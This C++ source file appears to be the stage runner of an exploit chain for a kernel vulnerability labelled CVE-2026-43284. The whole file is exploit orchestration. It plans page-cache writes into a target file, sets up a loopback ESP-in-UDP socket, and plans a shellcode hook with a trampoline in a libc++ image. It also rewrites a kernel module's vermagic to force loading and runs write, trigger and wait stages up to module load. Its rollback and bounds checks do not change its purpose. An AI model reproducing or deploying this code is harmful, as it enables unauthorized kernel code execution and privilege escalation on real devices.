/* B5-9c staged execution entry -- implementation. See stage_runner.hpp. */

#include "backend/cve_2026_43284/stage_runner.hpp"

#include "support/run_state.hpp"

#include <array>
#include <cerrno>
#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <limits>
#include <string>
#include <string_view>

#if defined(__linux__)
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#endif

namespace ghostlock::backend::cve_2026_43284::stage_runner {
    namespace {
        constexpr std::uint64_t kMinModuleBytes = 64U;
        constexpr std::uint64_t kMaxModuleBytes = std::uint64_t{64} * 1024U * 1024U;

        char bool_digit(bool value) noexcept { return value ? '1' : '0'; }

        void append_event(std::string &out, std::string_view step,
                          std::string_view status) {
            out += ghostlock::support::run_state::format_event(step, status);
        }

        void append_bool(std::string &out, bool value) { out.push_back(bool_digit(value)); }

        /* Fills the run.target diagnostics from a plan: the span that the valid
         * regions cover and whether any of them asks for a pre-image check.
         * Malformed or overflowing regions are skipped here; the closure check
         * rejects the plan separately. */
        void fill_plan_diagnostics(const steps::PatchPlan &plan,
                                   StageReport &report) noexcept {
            if (plan.regions == nullptr) {
                return;
            }
            bool any = false;
            std::uint64_t min_offset = std::numeric_limits<std::uint64_t>::max();
            std::uint64_t max_end = 0U;
            for (std::size_t i = 0U; i < plan.region_count; ++i) {
                const steps::PatchRegion &region = plan.regions[i];
                if (region.bytes == nullptr || region.len == 0U ||
                    region.offset >
                            std::numeric_limits<std::uint64_t>::max() - region.len) {
                    continue;
                }
                const std::uint64_t end =
                        region.offset + static_cast<std::uint64_t>(region.len);
                if (region.offset < min_offset) {
                    min_offset = region.offset;
                }
                if (end > max_end) {
                    max_end = end;
                }
                any = true;
            }
            if (any) {
                report.plan_offset = min_offset;
                report.plan_len = max_end - min_offset;
            }
        }

        /* Maps a chain failure onto the staged vocabulary. TargetOutOfBounds and
         * PreImageMismatch are fail-closed pre-write assertions and stay
         * distinct from the generic write rejection. */
        [[nodiscard]] StageError stage_error_from_chain(steps::ChainError error,
                                                        bool wrote) noexcept {
            switch (error) {
                case steps::ChainError::None:
                    return wrote ? StageError::None : StageError::WriteRejected;
                case steps::ChainError::TargetOutOfBounds:
                    return StageError::TargetOutOfBounds;
                case steps::ChainError::PreImageMismatch:
                    return StageError::PreImageMismatch;
                default:
                    return StageError::WriteRejected;
            }
        }

#if defined(__linux__)
        /* Creates the connected ESP-in-UDP sender socket from the session SA:
         * bind 127.0.0.1:sender_port, connect 127.0.0.1:encap_port. Returns the
         * fd, or a negative -errno. */
        int connect_esp_socket(const IpsecSaParams &sa) noexcept {
            const int fd = ::socket(AF_INET, SOCK_DGRAM, 0);
            if (fd < 0) {
                return -errno;
            }
            int opt = 1;
            (void)::setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt,
                               static_cast<socklen_t>(sizeof(opt)));
            sockaddr_in source{};
            source.sin_family = AF_INET;
            source.sin_port = htons(sa.sender_port);
            source.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
            if (::bind(fd, reinterpret_cast<sockaddr *>(&source),
                       static_cast<socklen_t>(sizeof(source))) < 0) {
                const int saved = errno;
                (void)::close(fd);
                return -saved;
            }
            sockaddr_in destination{};
            destination.sin_family = AF_INET;
            destination.sin_port = htons(sa.encap_port);
            destination.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
            if (::connect(fd, reinterpret_cast<sockaddr *>(&destination),
                          static_cast<socklen_t>(sizeof(destination))) < 0) {
                const int saved = errno;
                (void)::close(fd);
                return -saved;
            }
            return fd;
        }
#endif

        /* Conservative AArch64 PC-relative test for the displaced instruction.
         * The staged plan replays that word from the shellcode payload, so any
         * encoding whose result depends on its own PC cannot be relocated and
         * is rejected. The masks cover B/BL, B.cond, CBZ/CBNZ, TBZ/TBNZ,
         * ADR/ADRP and LDR-literal; over-rejection is the fail-closed
         * direction. */
        [[nodiscard]] constexpr bool is_pc_relative_instruction(
                std::uint32_t word) noexcept {
            if ((word & 0x7C000000U) == 0x14000000U) return true; /* B / BL */
            if ((word & 0xFF000010U) == 0x54000000U) return true; /* B.cond */
            if ((word & 0x7E000000U) == 0x34000000U) return true; /* CBZ/CBNZ */
            if ((word & 0x7E000000U) == 0x36000000U) return true; /* TBZ/TBNZ */
            if ((word & 0x1F000000U) == 0x10000000U) return true; /* ADR/ADRP */
            if ((word & 0x3B000000U) == 0x18000000U) return true; /* LDR literal */
            return false;
        }

        /* Appends 0x + lowercase hex, zero-padded to at least min_digits. */
        void append_hex(std::string &out, std::uint64_t value,
                        std::size_t min_digits) {
            static const char kDigits[] = "0123456789abcdef";
            char buf[16];
            std::size_t count = 0U;
            do {
                buf[count++] = kDigits[value & 0xFU];
                value >>= 4U;
            } while (value != 0U);
            out += "0x";
            for (std::size_t i = count; i < min_digits; ++i) {
                out.push_back('0');
            }
            while (count > 0U) {
                out.push_back(buf[--count]);
            }
        }

    } // namespace

    std::string_view stage_name(Stage stage) noexcept {
        switch (stage) {
            case Stage::Plan: return "plan";
            case Stage::Write: return "write";
            case Stage::Trigger: return "trigger";
            case Stage::Full: return "full";
        }
        return "unknown";
    }

    bool parse_stage(std::string_view text, Stage &out) noexcept {
        if (text == "plan") {
            out = Stage::Plan;
        } else if (text == "write") {
            out = Stage::Write;
        } else if (text == "trigger") {
            out = Stage::Trigger;
        } else if (text == "full") {
            out = Stage::Full;
        } else {
            return false;
        }
        return true;
    }

    std::string_view stage_error_name(StageError error) noexcept {
        switch (error) {
            case StageError::None: return "None";
            case StageError::InvalidArgument: return "InvalidArgument";
            case StageError::ModuleReadFailed: return "ModuleReadFailed";
            case StageError::ModulePrecheckFailed: return "ModulePrecheckFailed";
            case StageError::PlanInvalid: return "PlanInvalid";
            case StageError::TargetOutOfBounds: return "TargetOutOfBounds";
            case StageError::PreImageMismatch: return "PreImageMismatch";
            case StageError::NotReady: return "NotReady";
            case StageError::SessionRejected: return "SessionRejected";
            case StageError::WriteRejected: return "WriteRejected";
            case StageError::TriggerRejected: return "TriggerRejected";
            case StageError::WaitRejected: return "WaitRejected";
            case StageError::KsudFailed: return "KsudFailed";
            case StageError::CleanupRejected: return "CleanupRejected";
            case StageError::HookReadFailed: return "HookReadFailed";
            case StageError::HookImageTooLarge: return "HookImageTooLarge";
            case StageError::HookPlanFailed: return "HookPlanFailed";
            case StageError::HookIoUnavailable: return "HookIoUnavailable";
            case StageError::PluginRejected: return "PluginRejected";
        }
        return "Unknown";
    }

    bool build_module_plan(std::string_view module_path, PlanBuffer &out,
                           StageError &error) {
        out = PlanBuffer{};
        error = StageError::None;
        if (module_path.empty()) {
            error = StageError::InvalidArgument;
            return false;
        }
        const std::string path(module_path);
        std::FILE *file = std::fopen(path.c_str(), "rb");
        if (file == nullptr) {
            error = StageError::ModuleReadFailed;
            return false;
        }
        if (std::fseek(file, 0, SEEK_END) != 0) {
            (void)std::fclose(file);
            error = StageError::ModuleReadFailed;
            return false;
        }
        const long size = std::ftell(file);
        if (size < 0 || static_cast<std::uint64_t>(size) < kMinModuleBytes ||
            static_cast<std::uint64_t>(size) > kMaxModuleBytes) {
            (void)std::fclose(file);
            error = StageError::ModuleReadFailed;
            return false;
        }
        if (std::fseek(file, 0, SEEK_SET) != 0) {
            (void)std::fclose(file);
            error = StageError::ModuleReadFailed;
            return false;
        }
        const std::uint64_t module_bytes = static_cast<std::uint64_t>(size);
        const std::uint64_t padded = ((module_bytes + 15U) / 16U) * 16U;
        out.bytes.assign(static_cast<std::size_t>(padded), 0U);
        const std::size_t read =
                std::fread(out.bytes.data(), 1U, static_cast<std::size_t>(module_bytes),
                           file);
        (void)std::fclose(file);
        if (read != static_cast<std::size_t>(module_bytes)) {
            out = PlanBuffer{};
            error = StageError::ModuleReadFailed;
            return false;
        }
        out.module_bytes = module_bytes;
        out.blocks = static_cast<std::uint32_t>(padded / 16U);
        out.region.offset = 0U;
        out.region.bytes = out.bytes.data();
        out.region.len = static_cast<std::size_t>(padded);
        out.region.verify = true;
        out.region.rollback = true;
        out.region.label = "module";
        out.plan.regions = &out.region;
        out.plan.region_count = 1U;
        /* The plan declares its own extent so the closure assert can bound it
         * even before a carrier size is known. */
        out.plan.extent = padded;
        return true;
    }

    std::string_view hook_error_name(steps::HookPatchError error) noexcept {
        switch (error) {
            case steps::HookPatchError::None: return "None";
            case steps::HookPatchError::NullImage: return "NullImage";
            case steps::HookPatchError::ImageTooSmall: return "ImageTooSmall";
            case steps::HookPatchError::TargetNotFound: return "TargetNotFound";
            case steps::HookPatchError::GuardRejected: return "GuardRejected";
            case steps::HookPatchError::ShellcodeBuildFailed:
                return "ShellcodeBuildFailed";
            case steps::HookPatchError::ShellcodeBufferTooSmall:
                return "ShellcodeBufferTooSmall";
            case steps::HookPatchError::PlanFailed: return "PlanFailed";
            case steps::HookPatchError::IoUnavailable: return "IoUnavailable";
            case steps::HookPatchError::ReadFailed: return "ReadFailed";
            case steps::HookPatchError::WriteFailed: return "WriteFailed";
            case steps::HookPatchError::InvalidPlan: return "InvalidPlan";
            case steps::HookPatchError::NotApplied: return "NotApplied";
        }
        return "Unknown";
    }

    std::string_view hook_guard_name(steps::HookGuardPolicy guard) noexcept {
        return guard == steps::HookGuardPolicy::Reject ? "reject" : "skip";
    }

    bool plan_staged_hook(const StagedHookRequest &request,
                          StagedHookPlan &out) noexcept {
        out = StagedHookPlan{};
        out.attempted = true;
        out.target = request.hook_target;
        out.symbol = request.symbol;
        out.guard = request.guard;

        /* Default to the embedded upstream libcxx.S template, both when the
         * caller supplies no template and when the value slots must be bound
         * from the carrier path. */
        steps::ShellcodeTemplate default_template{};
        steps::ShellcodeBinding default_bindings[steps::kLibcxxValueSlotCount]{};
        std::size_t default_binding_count = 0U;
        const steps::ShellcodeTemplate *tmpl = request.tmpl;
        const steps::ShellcodeBinding *bindings = request.bindings;
        std::size_t binding_count = request.binding_count;
        std::size_t displaced_slot = request.displaced_slot;
        if (tmpl == nullptr) {
            steps::LibcxxHookBindings libcxx{};
            libcxx.carrier_path = request.carrier_path;
            steps::ShellcodeError binding_error = steps::ShellcodeError::None;
            if (!steps::make_libcxx_hook_bindings(libcxx, default_bindings,
                                                  default_binding_count,
                                                  binding_error)) {
                out.error = StageError::HookPlanFailed;
                out.hook_error = steps::HookPatchError::ShellcodeBuildFailed;
                return false;
            }
            default_template = steps::libcxx_shellcode_template();
            tmpl = &default_template;
            bindings = default_bindings;
            binding_count = default_binding_count;
            displaced_slot = steps::kLibcxxSlotDisplaced;
        }

        steps::HookPatchPlan plan{};
        steps::HookPatchError error = steps::HookPatchError::None;
        if (!steps::plan_hook_patch(
                    request.image, request.image_size, request.symbol, request.guard,
                    *tmpl, bindings, binding_count, displaced_slot,
                    request.shellcode_buf, request.shellcode_cap,
                    request.shellcode_orig_buf, request.io, plan, error)) {
            out.error = StageError::HookPlanFailed;
            out.hook_error = error;
            return false;
        }

        /* The displaced word is replayed from the payload; a PC-relative word
         * would execute against the wrong PC, so the staged plan fails closed
         * before any write path can be armed. */
        if (is_pc_relative_instruction(plan.hook.displaced_instruction)) {
            out.steal_unsafe = true;
            out.error = StageError::HookPlanFailed;
            out.hook_error = steps::HookPatchError::None;
            return false;
        }

        out.valid = true;
        out.error = StageError::None;
        out.hook_error = steps::HookPatchError::None;
        out.hook_file_offset = plan.hook.hook_file_offset;
        out.hook_vaddr = plan.hook.hook_vaddr;
        out.displaced_instruction = plan.hook.displaced_instruction;
        out.guard_instruction = plan.hook.guard_instruction;
        out.guard_skipped = plan.hook.guard_skipped;
        out.shellcode_file_offset = plan.hook.shellcode_file_offset;
        out.shellcode_vaddr = plan.hook.shellcode_vaddr;
        out.shellcode_len = plan.shellcode_size;
        out.payload_max = plan.hook.payload_max_bytes;
        out.trampoline_offset = plan.trampoline_offset;
        out.trampoline_pos = plan.trampoline_pos;
        out.trampoline_len = steps::kHookTrampolineBytes;
        return true;
    }

    bool read_hook_image(std::string_view path, std::size_t max_bytes,
                         std::vector<std::uint8_t> &out, StageError &error) {
        out.clear();
        error = StageError::None;
        if (path.empty() || max_bytes == 0U) {
            error = StageError::HookReadFailed;
            return false;
        }
        const std::string native_path(path);
        std::FILE *file = std::fopen(native_path.c_str(), "rb");
        if (file == nullptr) {
            error = StageError::HookReadFailed;
            return false;
        }
        if (std::fseek(file, 0, SEEK_END) != 0) {
            (void)std::fclose(file);
            error = StageError::HookReadFailed;
            return false;
        }
        const long size = std::ftell(file);
        if (size <= 0 || static_cast<std::uint64_t>(size) > max_bytes) {
            (void)std::fclose(file);
            error = size <= 0 ? StageError::HookReadFailed
                              : StageError::HookImageTooLarge;
            return false;
        }
        if (std::fseek(file, 0, SEEK_SET) != 0) {
            (void)std::fclose(file);
            error = StageError::HookReadFailed;
            return false;
        }
        const std::size_t bytes = static_cast<std::size_t>(size);
        out.assign(bytes, 0U);
        const std::size_t read = std::fread(out.data(), 1U, bytes, file);
        (void)std::fclose(file);
        if (read != bytes) {
            out.clear();
            error = StageError::HookReadFailed;
            return false;
        }
        return true;
    }

    StagedHookAssets prepare_staged_hook(RealChainContext &ctx,
                                         std::string_view hook_target,
                                         std::string_view hook_symbol,
                                         steps::HookGuardPolicy guard,
                                         std::vector<std::uint8_t> &image,
                                         std::uint8_t *shellcode,
                                         std::size_t shellcode_cap,
                                         std::uint8_t *shellcode_orig,
                                         const steps::HookPatchIo &io) {
        StagedHookAssets out{};
        out.status = StagedHookStatus::ImageReadFailed;
        out.error = StageError::HookReadFailed;
        StageError image_error = StageError::None;
        if (!read_hook_image(hook_target, steps::kElfMaxImageBytes, image,
                             image_error)) {
            out.status = image_error == StageError::HookImageTooLarge
                                 ? StagedHookStatus::ImageTooLarge
                                 : StagedHookStatus::ImageReadFailed;
            out.error = image_error;
            return out;
        }
        /* A read image with no page-cache write face is not an error path the
         * chain can fix: leave the context unarmed and report it. */
        if (shellcode == nullptr || shellcode_orig == nullptr ||
            shellcode_cap == 0U || !io.available()) {
            out.status = StagedHookStatus::IoUnavailable;
            out.error = StageError::HookIoUnavailable;
            return out;
        }
        ctx.libcxx_image = image.data();
        ctx.libcxx_image_size = image.size();
        ctx.hook_symbol = hook_symbol;
        ctx.hook_guard = guard;
        ctx.hook_shellcode = shellcode;
        ctx.hook_shellcode_cap = shellcode_cap;
        ctx.hook_shellcode_orig = shellcode_orig;
        ctx.hook_io = io;
        out.status = StagedHookStatus::Armed;
        out.error = StageError::None;
        return out;
    }

    bool precheck_staged_module(std::string_view module_path,
                                const lkm::DeviceKernelFacts &required,
                                lkm::ModuleFacts &facts,
                                lkm::LkmImageError &error) noexcept {
        facts = lkm::ModuleFacts{};
        error = lkm::LkmImageError::None;
        if (module_path.empty()) {
            error = lkm::LkmImageError::ReadFailed;
            return false;
        }
        return lkm::precheck_module_file(module_path, required, facts, error);
    }

    bool reconcile_module_vermagic(std::uint8_t *image, std::size_t image_size,
                                   const lkm::DeviceKernelFacts &required,
                                   bool allow_rewrite, lkm::ModuleFacts &facts,
                                   lkm::VermagicOutcome &outcome,
                                   lkm::LkmImageError &error) noexcept {
        facts = lkm::ModuleFacts{};
        outcome = lkm::VermagicOutcome::Unchecked;
        error = lkm::LkmImageError::None;
        if (image == nullptr) {
            error = lkm::LkmImageError::ReadFailed;
            return false;
        }
        lkm::ModuleFacts observed{};
        if (lkm::precheck_module_bytes(image, image_size, required, observed, error)) {
            facts = observed;
            outcome = lkm::VermagicOutcome::Original;
            return true;
        }
        /* Only a pure vermagic mismatch is rewritable; every other precheck
         * failure (bad ELF, signature, ...) stays fatal exactly as before. */
        if (error != lkm::LkmImageError::VermagicMismatch || !observed.has_vermagic) {
            return false;
        }
        /* The rewrite fills the required VERMAGIC_STRING. That reconciles only a
         * differing option tail; a release-token-only difference is not the
         * rewrite's job and is refused even when the policy allows it. */
        if (!allow_rewrite ||
            observed.vermagic_diff != lkm::VermagicDiffReason::Options) {
            facts = observed;
            outcome = lkm::VermagicOutcome::Required;
            return false;
        }
        char required_text[lkm::kVermagicMaxBytes] = {};
        std::size_t required_len = 0U;
        if (!lkm::required_vermagic(required, required_text, sizeof(required_text),
                                    required_len)) {
            facts = observed;
            error = lkm::LkmImageError::VermagicMissing;
            return false;
        }
        if (!lkm::rewrite_vermagic(image, image_size,
                                   std::string_view(required_text, required_len), error)) {
            facts = observed;
            return false;
        }
        lkm::ModuleFacts rewritten{};
        if (!lkm::precheck_module_bytes(image, image_size, required, rewritten, error)) {
            facts = rewritten;
            return false;
        }
        rewritten.vermagic_rewritten = true;
        facts = rewritten;
        outcome = lkm::VermagicOutcome::Rewritten;
        return true;
    }

    StageReport run_stage(Stage stage, const steps::ChainRequest &request,
                          const steps::ChainOps &ops,
                          steps::ChainWorkspace &workspace) noexcept {
        StageReport report{};
        report.stage = stage;
        report.dev_target = request.allow_dev_carrier_path;
        report.target_size = request.target_size;
        fill_plan_diagnostics(request.plan, report);

        /* Static plan closure (structure, declared extent, target-file size and
         * mutual overlap) is asserted before any op is bound, for every stage
         * including plan. run_chain() re-checks it before writing. */
        const steps::ChainError closure =
                steps::validate_plan_closure(request.plan, 0U, request.target_size);
        if (closure != steps::ChainError::None) {
            report.error = closure == steps::ChainError::TargetOutOfBounds
                                   ? StageError::TargetOutOfBounds
                                   : StageError::PlanInvalid;
            return report;
        }
        if (stage == Stage::Plan) {
            return report;
        }

        steps::ChainRequest local = request;
        local.stop_after = stage == Stage::Write ? steps::ChainStopAfter::Write
                                                 : steps::ChainStopAfter::Full;
        report.chain = steps::run_chain(local, ops, workspace);
        report.wrote = report.chain.blocks_written != 0U;
        report.verified = report.wrote &&
                          report.chain.blocks_verified == report.chain.blocks_written;
        report.triggered = (stage == Stage::Trigger || stage == Stage::Full) &&
                           report.wrote &&
                           report.chain.error != steps::ChainError::TriggerFailed;
        report.terminus = report.chain.lkm_loaded;
        report.wait_incomplete =
                report.chain.error == steps::ChainError::WaitTimeout ||
                report.chain.error == steps::ChainError::LkmFailed;
        report.preimage_ok = report.chain.preimage_checked;

        switch (stage) {
            case Stage::Plan:
                break;
            case Stage::Write:
                report.error = stage_error_from_chain(report.chain.error,
                                                      report.wrote);
                break;
            case Stage::Trigger:
            case Stage::Full:
                /* Upstream nativeRunAll rc semantics: a verified patch plus a
                 * fired sentry is not enough; the terminus outcome decides.
                 * Success 0, ksud marker failure 1, timeout 2, everything else
                 * (patch/write/trigger) 3. Trigger and full share the rule. */
                if (report.chain.error == steps::ChainError::None &&
                    report.terminus) {
                    report.error = StageError::None;
                } else if (report.chain.error == steps::ChainError::LkmFailed) {
                    report.error = StageError::KsudFailed;
                } else if (report.chain.error == steps::ChainError::WaitTimeout) {
                    report.error = StageError::WaitRejected;
                } else if (report.chain.error == steps::ChainError::TriggerFailed) {
                    report.error = StageError::TriggerRejected;
                } else if (report.chain.error ==
                           steps::ChainError::TargetOutOfBounds) {
                    report.error = StageError::TargetOutOfBounds;
                } else if (report.chain.error == steps::ChainError::PreImageMismatch) {
                    report.error = StageError::PreImageMismatch;
                } else {
                    report.error = StageError::WriteRejected;
                }
                break;
        }
        if (report.error == StageError::None && !report.chain.cleanup_ran) {
            report.error = StageError::CleanupRejected;
        }
        return report;
    }

    std::string format_stage_report(const StageReport &report,
                                    std::string_view module_path,
                                    std::string_view target_path,
                                    std::uint64_t module_bytes) {
        std::string out;
        out.reserve(1024U);

        {
            std::string status("stage=");
            status += stage_name(report.stage);
            append_event(out, "run.cve_2026_43284", status);
        }
        {
            std::string status("path=");
            status += module_path.empty() ? std::string_view("-") : module_path;
            status += " bytes=";
            status += std::to_string(module_bytes);
            status += " wrote=";
            append_bool(status, report.wrote);
            status += " verified=";
            append_bool(status, report.verified);
            status += " ko_vermagic=";
            status += lkm::vermagic_outcome_name(report.vermagic);
            append_event(out, "run.module", status);
        }
        {
            /* Write-location diagnostics: the target size the boundary assert
             * used, the plan span and whether a declared pre-image was
             * verified against the target. */
            std::string status("path=");
            status += target_path.empty() ? std::string_view("-") : target_path;
            status += " size=";
            status += std::to_string(report.target_size);
            status += " offset=";
            status += std::to_string(report.plan_offset);
            status += " len=";
            status += std::to_string(report.plan_len);
            status += " preimage=";
            status += report.preimage_ok ? "ok" : "absent";
            append_event(out, "run.target", status);
        }
        if (report.hook.attempted) {
            /* Read-only hook-plan diagnostics (B5-9h-1): the site, the stolen
             * word, the shellcode/trampoline geometry and the fail-closed
             * outcome. hook_steal is the displaced instruction word. */
            const StagedHookPlan &hook = report.hook;
            std::string status("hook_target=");
            status += hook.target.empty() ? std::string_view("-") : hook.target;
            status += " hook_symbol=";
            status += hook.symbol.empty() ? std::string_view("-") : hook.symbol;
            status += " hook_guard=";
            status += hook_guard_name(hook.guard);
            status += " hook_vma=";
            append_hex(status, hook.hook_vaddr, 1U);
            status += " hook_offset=";
            append_hex(status, hook.hook_file_offset, 1U);
            status += " hook_steal=";
            append_hex(status, hook.displaced_instruction, 8U);
            status += " guard_inst=";
            append_hex(status, hook.guard_instruction, 8U);
            status += " guard_skipped=";
            append_bool(status, hook.guard_skipped);
            status += " shellcode_len=";
            status += std::to_string(hook.shellcode_len);
            status += " shellcode_vma=";
            append_hex(status, hook.shellcode_vaddr, 1U);
            status += " shellcode_offset=";
            append_hex(status, hook.shellcode_file_offset, 1U);
            status += " payload_max=";
            status += std::to_string(hook.payload_max);
            status += " trampoline_len=";
            status += std::to_string(hook.trampoline_len);
            status += " trampoline_offset=";
            append_hex(status, hook.trampoline_offset, 1U);
            status += " trampoline_pos=";
            status += std::to_string(hook.trampoline_pos);
            status += " hook_error=";
            status += hook.steal_unsafe
                              ? std::string_view("StealUnsafe")
                              : hook_error_name(hook.hook_error);
            append_event(out, "run.hook", status);
        }
        {
            /* Explicit misuse guard: the dev-only non-vendor carrier hatch is
             * always visible in the records. */
            append_event(out, "run.dev_target",
                         report.dev_target ? "allow=1" : "allow=0");
        }
        if (report.stage != Stage::Plan) {
            const steps::ChainResult &chain = report.chain;
            std::string status("written=");
            status += std::to_string(chain.blocks_written);
            status += " verified=";
            status += std::to_string(chain.blocks_verified);
            status += " rolled_back=";
            status += std::to_string(chain.blocks_rolled_back);
            status += " cleanup=";
            append_bool(status, chain.cleanup_ran);
            status += " journal_overflow=";
            append_bool(status, chain.journal_overflow);
            status += " rollback_incomplete=";
            append_bool(status, chain.rollback_incomplete);
            status += " crash_dump=";
            append_bool(status, chain.crash_dump_patched);
            /* B5-9h-4 hook application: planned/armed describe the assets the
             * runner prepared, hook is the chain's applied flag and hook_error
             * names the first reason the hook was not armed/applied. */
            status += " hook_planned=";
            append_bool(status, report.hook_planned);
            status += " hook_armed=";
            append_bool(status, report.hook_armed);
            status += " hook=";
            append_bool(status, chain.hook_applied);
            status += " hook_restored=";
            append_bool(status, chain.hook_restored);
            status += " hook_error=";
            status += stage_error_name(report.hook_error);
            append_event(out, "run.chain", status);

            if (report.stage == Stage::Trigger || report.stage == Stage::Full) {
                std::string trigger("fired=");
                append_bool(trigger, report.triggered);
                trigger += " wait_incomplete=";
                append_bool(trigger, report.wait_incomplete);
                append_event(out, "run.trigger", trigger);

                std::string wait("outcome=");
                wait += chain_wait_name(chain.wait);
                wait += " terminus=";
                append_bool(wait, report.terminus);
                wait += " error=";
                wait += chain_error_name(chain.error);
                append_event(out, "run.wait", wait);
            }
        }
        {
            std::string status;
            if (report.error == StageError::None) {
                status = "ok error=None";
            } else {
                status = "failed error=";
                status += stage_error_name(report.error);
            }
            append_event(out, "run.cve_2026_43284", status);
        }
        return out;
    }

    int stage_exit_code(const StageReport &report) noexcept {
        /* trigger/full: upstream nativeRunAll rc (0 ok / 1 ksud failed /
         * 2 timeout / 3 patch). */
        if (report.stage == Stage::Trigger || report.stage == Stage::Full) {
            switch (report.error) {
                case StageError::None: return 0;
                case StageError::KsudFailed: return 1;
                case StageError::WaitRejected: return 2;
                default: return 3;
            }
        }
        switch (report.error) {
            case StageError::None: return 0;
            case StageError::WriteRejected: return 3;
            case StageError::TriggerRejected: return 4;
            case StageError::WaitRejected: return 5;
            case StageError::CleanupRejected: return 6;
            case StageError::InvalidArgument:
            case StageError::ModuleReadFailed:
            case StageError::ModulePrecheckFailed:
            case StageError::PlanInvalid:
            case StageError::TargetOutOfBounds:
            case StageError::PreImageMismatch:
            case StageError::NotReady:
            case StageError::SessionRejected:
            case StageError::KsudFailed:
            case StageError::HookReadFailed:
            case StageError::HookImageTooLarge:
            case StageError::HookPlanFailed:
            case StageError::HookIoUnavailable:
            case StageError::PluginRejected:
                return 2;
        }
        return 2;
    }

} // namespace ghostlock::backend::cve_2026_43284::stage_runner
